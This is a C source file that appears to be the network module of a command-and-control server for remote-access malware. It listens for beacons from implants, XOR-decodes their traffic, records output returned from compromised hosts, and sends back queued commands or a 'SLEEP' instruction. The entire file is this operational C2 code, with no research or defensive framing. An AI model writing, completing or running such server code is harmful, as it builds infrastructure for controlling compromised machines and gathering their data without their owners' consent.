#include "Network.h"
#include "Cipher.h"
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
  #include <winsock2.h>
#else
  #include <fcntl.h>
  #include <netinet/in.h>
#endif

int NetInit(void)
{
#ifdef _WIN32
    WSADATA Wsa;
    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0)
        return 0;
#endif
    return 1;
}

void NetShutdown(void)
{
#ifdef _WIN32
    WSACleanup();
#endif
}

NetSock NetListen(const char *Addr, int Port)
{
    NetSock Sock = socket(AF_INET, SOCK_STREAM, 0);
    if (Sock == NetInvalid)
        return NetInvalid;

    int Opt = 1;
    setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&Opt, sizeof(Opt));

    struct sockaddr_in Sin;
    memset(&Sin, 0, sizeof(Sin));
    Sin.sin_family      = AF_INET;
    Sin.sin_addr.s_addr = inet_addr(Addr);
    Sin.sin_port        = htons((unsigned short)Port);

    if (bind(Sock, (struct sockaddr *)&Sin, sizeof(Sin)) < 0 ||
        listen(Sock, 16) < 0) {
        NetClose(Sock);
        return NetInvalid;
    }

    return Sock;
}

void NetNonBlock(NetSock Sock)
{
#ifdef _WIN32
    unsigned long F = 1;
    ioctlsocket(Sock, FIONBIO, &F);
#else
    fcntl(Sock, F_SETFL, fcntl(Sock, F_GETFL, 0) | O_NONBLOCK);
#endif
}

void NetHandleBeacon(NetSock Listener, Session *S)
{
    struct sockaddr_in Peer;
    socklen_t          PeerLen = sizeof(Peer);

    NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
    if (Conn == NetInvalid)
        return;

    char Buf[BufSize] = {0};
    int  N            = recv(Conn, Buf, BufSize - 1, 0);

    if (N <= 0) {
        NetClose(Conn);
        return;
    }

    Buf[N] = '\0';
    ApplyXor(Buf, (size_t)N);

    int WasActive = S->Active;
    SessionRegister(S, inet_ntoa(Peer.sin_addr));

    int IsResult = WasActive && strcmp(Buf, "Standby") != 0;

    if (IsResult) {
        memset(S->LastOutput, 0, BufSize);
        memcpy(S->LastOutput, Buf, (size_t)N);
        SessionNotifyOutput(S);
    }

    if (S->HasPending) {
        size_t CmdLen = strlen(S->Pending);
        char   Enc[BufSize];
        memcpy(Enc, S->Pending, CmdLen);
        ApplyXor(Enc, CmdLen);
        send(Conn, Enc, (int)CmdLen, 0);
        memset(S->Pending, 0, BufSize);
        S->HasPending = 0;
    } else {
        char Sleep[] = "SLEEP";
        ApplyXor(Sleep, strlen(Sleep));
        send(Conn, Sleep, (int)strlen(Sleep), 0);
    }

    NetClose(Conn);
}
